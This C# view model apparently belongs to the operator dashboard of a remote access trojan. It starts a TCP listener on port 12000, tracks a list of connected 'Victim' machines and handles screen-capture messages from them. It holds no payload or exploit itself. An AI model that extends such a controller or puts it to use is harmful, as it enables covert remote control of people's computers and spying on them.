using Controller.Models;
using Controller.Services;
using System.Collections.ObjectModel;
using System.Diagnostics;

namespace Controller.ViewModels.Pages
{
    public partial class DashboardViewModel : ObservableObject
    {
        private bool _isRunning = false;

        [ObservableProperty]
        private string _status = "Start Server";

        [ObservableProperty]
        private ObservableCollection<Victim> _victimList = [];

        [RelayCommand]
        private void OnToggleServer() {
            Status = (_isRunning ? "Start" : "Stop") + " Server";
            
            UDPService.ToggleUDPService(null);

            if (!_isRunning)
            {
                TCPService.Start(12000, MessageHandler);
                TCPService.OnVictimConnected += OnVictimConnected;
                TCPService.OnVictimDisconnected += OnVictimDisconnected;
            }
            else
            {
                TCPService.Stop();
                TCPService.OnVictimConnected -= OnVictimConnected;
                TCPService.OnVictimDisconnected -= OnVictimDisconnected;
            }

            _isRunning = !_isRunning;
        }

        private void OnVictimDisconnected(Victim victim)
        {
            VictimList?.Remove(victim);
        }

        private void OnVictimConnected(Victim victim)
        {
            VictimList?.Add(victim);
        }

        private static Task MessageHandler(IVictim victim, string messageType, object payload)
        {
            switch (messageType.ToLower())
            {
                case MSGType.ScreenMSG:
                    var sMsg = (ScreenMSG)payload;
                    Debug.WriteLine($"ScreenMSG received: {sMsg.DesiredQuality} {sMsg.ToPresent}");
                    break;
            }

            return Task.CompletedTask;
        }
    }
}
